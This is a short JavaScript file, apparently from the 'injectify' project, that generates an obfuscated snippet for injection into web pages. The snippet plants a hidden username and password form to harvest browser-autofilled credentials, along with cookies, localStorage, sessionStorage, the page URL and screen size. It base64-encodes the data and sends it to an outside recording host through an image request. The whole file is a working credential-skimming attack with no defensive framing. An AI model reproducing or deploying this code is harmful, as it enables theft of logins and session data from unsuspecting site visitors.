let screenDimensions= true,
	windowLocation	= true,
	localStorage	= true,
	sessionStorage	= true,
	cookies			= true,
	projectName		= "myproject",
	proxyURL		= "//injectify.samdd.me/record/"

let json		= '',
	variables	= ''

if (screenDimensions) {
	variables	+= 'j = k.screen, a = k.devicePixelRatio,'
	json		+= 'e: j.height * a, f: j.width * a,'
}
if (windowLocation)	json += 'd: k.location.href,'
if (localStorage)	json += 'g: localStorage,'
if (sessionStorage)	json += 'h: sessionStorage,'
if (cookies)		json += 'i: d.cookie,'

if (variables)	variables 	= ',' + variables.slice(0, -1)
if (json) 		json 		= ',' + json.slice(0, -1)

let script = `
var d = document,
	v = "input",
	w = d.createElement("form"),
	x = d.createElement(v),
	r = new Image(),
	k = window` + variables + `
x.name = ""
x.style = "display:none"  

var y = x.cloneNode()
y.type = atob("cGFzc3dvcmQ=")

w.appendChild(x)
w.appendChild(y)
d.body.appendChild(w)

y.addEventListener(v, function () {
	var i = {
		a: atob("` + btoa(projectName) + `"),
		b: x.value,
		c: y.value` + json + `
	}
	r.src = atob("` + btoa(proxyURL) + `") + btoa(JSON.stringify(i))
	w.remove()
})
`
console.log(script)